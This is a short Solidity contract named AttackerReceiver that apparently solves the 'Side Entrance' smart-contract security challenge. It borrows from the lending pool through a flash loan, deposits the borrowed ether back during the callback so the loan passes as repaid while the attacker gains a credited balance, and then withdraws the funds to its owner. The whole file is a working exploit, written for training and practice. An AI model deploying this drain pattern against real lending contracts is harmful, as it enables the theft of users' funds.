// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract AttackerReceiver {
    using Address for address payable;

    SideEntranceLenderPool public immutable pool;
    address public owner;

    constructor (address poolAddress_) {
        pool = SideEntranceLenderPool(poolAddress_);
        owner = msg.sender;
    }

    function attack(uint256 amount_) public {
        require(msg.sender == owner, "Only owner can call this function");
        pool.flashLoan(amount_);
    }

    function execute() public payable {
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can call this function");
        pool.withdraw();
        payable(msg.sender).sendValue( address(this).balance );
    }

    receive () external payable {}
}